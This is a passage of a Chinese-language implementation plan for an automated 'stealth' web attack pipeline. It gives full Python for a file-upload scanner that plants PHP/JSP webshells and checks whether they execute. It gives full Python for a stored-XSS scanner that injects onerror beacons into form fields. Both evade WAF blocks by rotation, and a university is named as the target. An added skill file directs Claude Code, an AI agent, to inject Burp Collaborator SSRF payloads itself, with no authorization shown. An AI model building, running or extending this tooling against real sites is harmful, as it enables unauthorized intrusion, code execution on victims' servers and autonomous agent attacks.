    headers: dict[str, str] = {"User-Agent": "Mozilla/5.0"}
    if cookie:
        headers["Cookie"] = cookie

    def _post() -> requests.Response:
        return requests.post(  # noqa: S113
            upload_url,
            headers=headers,
            files={field_name: (filename, data, content_type)},
            proxies=BURP_PROXY,
            timeout=15,
            verify=False,  # noqa: S501
        )

    try:
        resp, _, _ = fetcher.fetch_with_rotation(_post)
        time.sleep(delay)
        if isinstance(resp, requests.Response):
            return resp.status_code, resp.text[:8192]
    except Exception:  # noqa: BLE001
        pass
    time.sleep(delay)
    return 0, ""


def write_finding(
    conn: sqlite3.Connection,
    target_id: int,
    upload_url: str,
    field_name: str,
    payload_name: str,
    evidence: str,
    risk: str,
) -> str:
    """写入 findings 表，返回 finding id。"""
    fid = f"F-UP-{uuid.uuid4().hex[:8]}"
    try:
        conn.execute(
            """INSERT OR IGNORE INTO findings
               (id, target_id, type, url, param, method, payload, evidence, risk, remediation, confirmed_at)
               VALUES (?, ?, 'file_upload', ?, ?, 'POST', ?, ?, ?, '校验文件类型/禁止执行上传目录', ?)""",
            (fid, target_id, upload_url, field_name, payload_name, evidence, risk, datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        )
        conn.commit()
    except sqlite3.Error as e:
        print(f"  [warn] findings 写入失败: {e}", file=sys.stderr)
    return fid


def write_upload_sp(
    conn: sqlite3.Connection,
    upload_url: str,
    field_name: str,
    payload_name: str,
    evidence: str,
    risk: str,
) -> bool:
    """写入 suspicious_points，返回是否新插入。"""
    sp_id = f"SP-UP-{uuid.uuid4().hex[:8]}"
    try:
        cursor = conn.execute(
            """INSERT OR IGNORE INTO suspicious_points
               (id, url, param, method, test_type, evidence, source, reasoning, risk, test_status, created_at)
               VALUES (?, ?, ?, 'POST', 'file_upload', ?, 'upload_scan', ?, ?, 'untested', ?)""",
            (sp_id, upload_url, field_name, evidence, f"上传 {payload_name} 成功，需人工确认执行", risk, datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        )
        conn.commit()
        return cursor.rowcount > 0
    except sqlite3.Error as e:
        print(f"  [warn] suspicious_points 写入失败: {e}", file=sys.stderr)
        return False


def main() -> None:
    parser = argparse.ArgumentParser(description="文件上传利用扫描")
    parser.add_argument("--target", required=True)
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--max-rotations", type=int, default=3, dest="max_rotations")
    args = parser.parse_args()

    db_path = find_db(args.target)
    conn = connect(db_path)

    row = conn.execute("SELECT seed_url FROM scan_state WHERE id=1").fetchone()
    seed_url = row["seed_url"] if row else None
    if not seed_url:
        print("[error] 无 seed_url", file=sys.stderr)
        conn.close()
        sys.exit(1)

    parsed_seed = urlparse(seed_url)
    base_url = f"{parsed_seed.scheme}://{parsed_seed.netloc}"

    target_row = conn.execute("SELECT id FROM targets LIMIT 1").fetchone()
    target_id: int = target_row["id"] if target_row else 1

    cookie = get_auth_cookie_header(str(db_path), seed_url, role="primary")
    upload_targets = find_upload_targets(conn)
    print(f"[upload_scan] 目标: {len(upload_targets)} 个上传端点  delay={args.delay}s")

    fetcher = RotatingFetcher(max_rotations=args.max_rotations, rotate_delay=30.0)
    found = 0
    tested = 0

    for target in upload_targets:
        payloads = build_payloads()
        for pname, pinfo in payloads.items():
            status, body = upload_file(
                target["upload_url"], target["field_name"],
                pinfo["filename"], pinfo["content_type"], pinfo["data"],
                cookie, fetcher, args.delay
            )
            tested += 1
            if status not in (200, 201):
                continue

            file_url = extract_uploaded_url(body, base_url)
            evidence = f"payload={pname} status={status} file_url={file_url}"

            if file_url and pname in ("php_webshell", "php_jpg", "jsp_webshell"):
                # 验证是否执行
                try:
                    vresp = requests.get(file_url, proxies=BURP_PROXY, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})  # noqa: S501,S113
                    time.sleep(args.delay)
                    if is_webshell_output(vresp.text):
                        evidence += f" EXECUTED: {vresp.text[:200]}"
                        write_finding(conn, target_id, target["upload_url"], target["field_name"], pname, evidence, "Critical")
                        print(f"  [!!!] Critical RCE via upload: {file_url}")
                        found += 1
                        break
                except Exception:  # noqa: BLE001
                    pass

            if pname == "svg_xss" and file_url:
                evidence += " SVG accessible"
                write_upload_sp(conn, target["upload_url"], target["field_name"], pname, evidence, "High")
                print(f"  [ ! ] SVG upload success: {file_url}")
                found += 1
                break

    conn.close()
    print(f"\n[UPLOAD_SCAN] targets={len(upload_targets)} tested={tested} found={found}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: 运行 upload_scan 测试**

```bash
uv run pytest TOOLS/tests/test_upload_scan.py -v
```

期望：全部 PASS（11 个测试）

- [ ] **Step 3: Commit**

```bash
git add TOOLS/pipeline/upload_scan.py TOOLS/tests/test_upload_scan.py
git commit -m "feat: add upload_scan pipeline with SVG/PHP/JSP webshell testing"
```

---

## Task 4: 实现 xss_scan.py (TDD GREEN)

**Files:**
- Create: `TOOLS/pipeline/xss_scan.py`

- [ ] **Step 1: 创建 TOOLS/pipeline/xss_scan.py**

```python
# TOOLS/pipeline/xss_scan.py
"""存储型 XSS 检测：表单 text/textarea 注入唯一 beacon，重新 fetch 验证未转义反射。

用法:
  uv run python TOOLS/pipeline/xss_scan.py --target "台州学院"

输出:
  [XSS_SCAN] targets={n} tested={m} found_stored={k} found_reflected={j}
"""
from __future__ import annotations

import argparse
import json
import sqlite3
import sys
import time
import uuid
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin

import requests
import urllib3

urllib3.disable_warnings()

_TOOLS = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_TOOLS))

from db.cookie_helper import get_auth_cookie_header  # noqa: E402
from db.db_utils import connect, find_db  # noqa: E402
from utils.waf_rotate import RotatingFetcher  # noqa: E402

BURP_PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

XSS_SKIP_TYPES: frozenset[str] = frozenset({
    "hidden", "submit", "button", "checkbox", "radio",
    "file", "password", "image", "reset", "color", "range",
})

XSS_SKIP_NAMES: frozenset[str] = frozenset({
    "_token", "csrf", "__requestverificationtoken", "authenticity_token",
})


def build_beacon(uid: str) -> str:
    """返回含唯一标识符的 XSS payload。"""
    return f'<img src=x id=xssbeacon_{uid} onerror=this.src>'


def beacon_in_response(beacon_uid: str, html: str) -> bool:
    """True if the beacon tag appears unescaped in html."""
    marker = f"id=xssbeacon_{beacon_uid}"
    if marker not in html:
        return False
    # 确认不是 HTML 实体编码形式（&lt;img ...&gt;）
    idx = html.find(marker)
    prefix = html[max(0, idx - 10): idx]
    return "&lt;" not in prefix


def find_xss_targets(conn: sqlite3.Connection) -> list[dict]:
    """从 pages.forms_json 找 text/textarea 类型的 input，返回探测目标列表。"""
    targets: list[dict] = []
    seen: set[tuple[str, str]] = set()

    rows = conn.execute(
        "SELECT url, forms_json FROM pages WHERE forms_json IS NOT NULL AND status='visited'"
    ).fetchall()

    for row in rows:
        page_url = row[0] if isinstance(row, tuple) else row["url"]
        forms_raw = row[1] if isinstance(row, tuple) else row["forms_json"]
        if not forms_raw:
            continue
        try:
            forms = json.loads(forms_raw)
        except (json.JSONDecodeError, TypeError):
            continue

        for form in forms:
            action = form.get("action", page_url) or page_url
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])

            for inp in inputs:
                itype = inp.get("type", "text").lower()
                iname = inp.get("name", "")
                itag = inp.get("tag", "input").lower()
                hidden = inp.get("hidden", False)

                if hidden or itype in XSS_SKIP_TYPES:
                    continue
                if iname.lower() in XSS_SKIP_NAMES:
                    continue
                if not iname:
                    continue
                if itag not in ("input", "textarea"):
                    continue

                key = (action, iname)
                if key not in seen:
                    seen.add(key)
                    targets.append({
                        "page_url": page_url,
                        "form_action": action,
                        "form_method": method,
                        "param": iname,
                        "all_inputs": inputs,
                    })

    return targets


def _build_form_data(inputs: list[dict], target_param: str, payload: str) -> dict[str, str]:
    """Build form submission dict, injecting payload only into target_param."""
    data: dict[str, str] = {}
    for inp in inputs:
        iname = inp.get("name", "")
        itype = inp.get("type", "text").lower()
        ival = inp.get("value", "")
        if not iname or itype in ("submit", "button", "image", "reset"):
            continue
        data[iname] = payload if iname == target_param else (ival or "test")
    return data


def submit_form(
    form_action: str,
    method: str,
    form_data: dict[str, str],
    cookie: str | None,
    fetcher: RotatingFetcher,
    delay: float,
) -> tuple[int, str]:
    """Submit form; returns (status_code, response_body[:8192])."""
    headers: dict[str, str] = {"User-Agent": "Mozilla/5.0"}
    if cookie:
        headers["Cookie"] = cookie

    def _submit() -> requests.Response:
        if method == "POST":
            return requests.post(form_action, data=form_data, headers=headers, proxies=BURP_PROXY, timeout=10, verify=False)  # noqa: S501,S113
        return requests.get(form_action, params=form_data, headers=headers, proxies=BURP_PROXY, timeout=10, verify=False)  # noqa: S501,S113

    try:
        resp, _, _ = fetcher.fetch_with_rotation(_submit)
        time.sleep(delay)
        if isinstance(resp, requests.Response):
            return resp.status_code, resp.text[:8192]
    except Exception:  # noqa: BLE001
        pass
    time.sleep(delay)
    return 0, ""


def fetch_page(url: str, cookie: str | None, fetcher: RotatingFetcher, delay: float) -> str:
    """Fetch a page and return body[:16384]."""
    headers: dict[str, str] = {"User-Agent": "Mozilla/5.0"}
    if cookie:
        headers["Cookie"] = cookie

    def _get() -> requests.Response:
        return requests.get(url, headers=headers, proxies=BURP_PROXY, timeout=10, verify=False)  # noqa: S501,S113

    try:
        resp, _, _ = fetcher.fetch_with_rotation(_get)
        time.sleep(delay)
        if isinstance(resp, requests.Response):
            return resp.text[:16384]
    except Exception:  # noqa: BLE001
        pass
    time.sleep(delay)
    return ""


def write_xss_sp(
    conn: sqlite3.Connection,
    url: str,
    param: str,
    beacon_uid: str,
    page_url: str,
    is_stored: bool,
) -> bool:
    """写 suspicious_points；URL+param 组合去重；返回是否新插入。"""
    sp_id = f"SP-XSS-{uuid.uuid4().hex[:8]}"
    risk = "High" if is_stored else "Low"
    xss_type = "stored_xss" if is_stored else "reflected_xss"
    evidence = f"beacon_uid={beacon_uid} found_in={'page_url' if is_stored else 'same_response'}"
    reasoning = (
        f"存储型 XSS：提交表单 {url} param={param}，在 {page_url} 发现未转义反射"
        if is_stored
        else f"反射型 XSS（低置信度）：param={param}"
    )
    try:
        existing = conn.execute(
            "SELECT id FROM suspicious_points WHERE url=? AND param=? AND test_type=?",
            (url, param, xss_type),
        ).fetchone()
        if existing:
            return False
        conn.execute(
            """INSERT INTO suspicious_points
               (id, url, param, method, test_type, evidence, source, reasoning, risk, test_status, created_at)
               VALUES (?, ?, ?, 'POST', ?, ?, 'xss_scan', ?, ?, 'untested', ?)""",
            (sp_id, url, param, xss_type, evidence, reasoning, risk, datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        )
        conn.commit()
        return True
    except sqlite3.Error as e:
        print(f"  [warn] SP 写入失败: {e}", file=sys.stderr)
        return False


def main() -> None:
    parser = argparse.ArgumentParser(description="存储型 XSS 检测")
    parser.add_argument("--target", required=True)
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--max-rotations", type=int, default=3, dest="max_rotations")
    args = parser.parse_args()

    db_path = find_db(args.target)
    conn = connect(db_path)

    row = conn.execute("SELECT seed_url FROM scan_state WHERE id=1").fetchone()
    seed_url = row["seed_url"] if row else None
    if not seed_url:
        print("[error] 无 seed_url", file=sys.stderr)
        conn.close()
        sys.exit(1)

    cookie = get_auth_cookie_header(str(db_path), seed_url, role="primary")
    xss_targets = find_xss_targets(conn)
    print(f"[xss_scan] 目标: {len(xss_targets)} 个表单字段  delay={args.delay}s")

    fetcher = RotatingFetcher(max_rotations=args.max_rotations, rotate_delay=30.0)
    found_stored = 0
    found_reflected = 0
    tested = 0

    for target in xss_targets:
        uid = uuid.uuid4().hex[:8]
        beacon = build_beacon(uid)
        form_data = _build_form_data(target["all_inputs"], target["param"], beacon)

        status, body = submit_form(
            target["form_action"], target["form_method"],
            form_data, cookie, fetcher, args.delay
        )
        tested += 1

        if status == 0:
            continue

        # 检查同一响应（反射型）
        if beacon_in_response(uid, body):
            write_xss_sp(conn, target["form_action"], target["param"], uid, target["form_action"], is_stored=False)
            found_reflected += 1
            print(f"  [ ! ] Reflected XSS (low conf): {target['form_action']} param={target['param']}")
            continue

        # 重新 GET 表单所在页面检查（存储型）
        stored_body = fetch_page(target["page_url"], cookie, fetcher, args.delay)
        if beacon_in_response(uid, stored_body):
            write_xss_sp(conn, target["form_action"], target["param"], uid, target["page_url"], is_stored=True)
            found_stored += 1
            print(f"  [!!!] Stored XSS: submit={target['form_action']} param={target['param']} found_at={target['page_url']}")

    conn.close()
    print(f"\n[XSS_SCAN] targets={len(xss_targets)} tested={tested} found_stored={found_stored} found_reflected={found_reflected}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: 运行 xss_scan 测试**

```bash
uv run pytest TOOLS/tests/test_xss_scan.py -v
```

期望：全部 PASS（10 个测试）

- [ ] **Step 3: Commit**

```bash
git add TOOLS/pipeline/xss_scan.py TOOLS/tests/test_xss_scan.py
git commit -m "feat: add xss_scan pipeline for stored XSS detection via form beacon"
```

---

## Task 5: 接线 vuln_scan 阶段 + 更新 SKILL.md

**Files:**
- Modify: `TOOLS/run_scan.py`
- Modify: `TOOLS/tests/test_run_scan.py`
- Modify: `.claude/skills/stealth-scanner/SKILL.md`

- [ ] **Step 1: 修改 handle_api_fuzz — 改 set_phase 目标**

在 `TOOLS/run_scan.py` 中，找到 `handle_api_fuzz` 函数里的 `set_phase(conn, "exploit")`，改为 `set_phase(conn, "vuln_scan")`。同时更新 print_tag 中的说明：

```python
    set_phase(conn, "vuln_scan")
    print_tag(
        "PHASE_TRANSITION",
        [
            f"api_fuzz → vuln_scan    新增 hunt_queue 条目: {after_hq - before_hq}",
            "[run_scan] api_fuzz 完成，切换到 vuln_scan",
        ],
    )
```

- [ ] **Step 2: 在 handle_exploit 之前添加 handle_vuln_scan**

```python
def handle_vuln_scan(target: str, db_path: Path, conn: sqlite3.Connection) -> None:
    """phase=vuln_scan: SSRF候选 + 文件上传 + 存储型XSS 三项专项扫描。"""
    print("[run_scan] phase=vuln_scan → 运行 ssrf_scan / upload_scan / xss_scan ...")

    def _count_sp(source: str) -> int:
        try:
            return conn.execute(
                "SELECT count(*) FROM suspicious_points WHERE source=?", (source,)
            ).fetchone()[0]
        except sqlite3.OperationalError:
            return 0

    def _count_hq(etype: str) -> int:
        try:
            return conn.execute(
                "SELECT count(*) FROM hunt_queue WHERE endpoint_type=?", (etype,)
            ).fetchone()[0]
        except sqlite3.OperationalError:
            return 0

    before_ssrf = _count_hq("ssrf_candidate")
    before_upload = _count_sp("upload_scan")
    before_xss = _count_sp("xss_scan")

    for script in ("ssrf_scan.py", "upload_scan.py", "xss_scan.py"):
        subprocess.run(  # noqa: S603
            [PYTHON, str(PIPELINE_DIR / script), "--target", target],
            timeout=600,
            check=False,
        )

    after_ssrf = _count_hq("ssrf_candidate")
    after_upload = _count_sp("upload_scan")
    after_xss = _count_sp("xss_scan")

    set_phase(conn, "exploit")
    print_tag(
        "PHASE_TRANSITION",
        [
            f"vuln_scan → exploit",
            f"  SSRF 候选: {after_ssrf - before_ssrf} 条写入 hunt_queue",
            f"  文件上传: {after_upload - before_upload} 条写入 suspicious_points",
            f"  存储型XSS: {after_xss - before_xss} 条写入 suspicious_points",
        ],
    )
```

- [ ] **Step 3: 将 "vuln_scan" 加入 HANDLERS**

在 `TOOLS/run_scan.py` 的 `HANDLERS` 字典中，在 `"api_fuzz": handle_api_fuzz` 之后、`"exploit": handle_exploit` 之前插入：

```python
    "vuln_scan": handle_vuln_scan,
```

- [ ] **Step 4: 更新 test_run_scan.py**

在 `TOOLS/tests/test_run_scan.py` 中，找到涉及 `handle_api_fuzz` 的 `set_phase` 断言（如果有），更新为期望切换到 `vuln_scan`。添加一个新测试：

```python
def test_handlers_contains_vuln_scan():
    from run_scan import HANDLERS
    assert "vuln_scan" in HANDLERS
```

- [ ] **Step 5: 运行 run_scan 测试**

```bash
uv run pytest TOOLS/tests/test_run_scan.py -v
```

期望：全部 PASS

- [ ] **Step 6: 更新 SKILL.md — 状态机 + Collaborator OOB 步骤**

在 `.claude/skills/stealth-scanner/SKILL.md` 中：

**A.** 状态机表格加 `vuln_scan` 行（在 api_fuzz 与 exploit 之间）：
```
| `vuln_scan` | SSRF候选发现 + 文件上传测试 + 存储型XSS beacon注入 → suspicious_points/hunt_queue | `ssrf_scan.py` + `upload_scan.py` + `xss_scan.py` | `exploit` |
```

**B.** 在 `vuln_scan` 阶段完成后增加 Collaborator OOB 验证步骤：
```markdown
### vuln_scan 阶段后：Collaborator OOB SSRF 验证

`handle_vuln_scan` 完成后，Claude Code 直接执行以下步骤对 hunt_queue 中的 SSRF 候选做 OOB 确认：

1. 查询候选：`SELECT id, url, notes FROM hunt_queue WHERE endpoint_type='ssrf_candidate' AND status='queued' LIMIT 10`
2. 对每条候选：
   a. 调用 `mcp__burp__generate_collaborator_payload` 生成 payload URL
   b. 调用 `mcp__burp__send_http1_request` 注入 payload（替换 notes 中的 param）
   c. 等待 3s，调用 `mcp__burp__get_collaborator_interactions(payloadId=...)` 查询 DNS/HTTP 回显
   d. 有回显 → `UPDATE hunt_queue SET status='confirmed', notes=notes||' OOB_HIT' WHERE id=?`
   e. 无回显 → `UPDATE hunt_queue SET status='tested' WHERE id=?`
```

**C.** 输出标签表加 `[SSRF_SCAN]`、`[UPLOAD_SCAN]`、`[XSS_SCAN]` 行。

- [ ] **Step 7: 运行全部测试**

```bash
uv run pytest TOOLS/tests/ -q
```

期望：265+ tests pass（新增约 32 个）

- [ ] **Step 8: Commit**

```bash
git add TOOLS/run_scan.py TOOLS/tests/test_run_scan.py .claude/skills/stealth-scanner/SKILL.md
git commit -m "feat: wire vuln_scan phase (ssrf+upload+xss) into stealth-scanner pipeline"
```
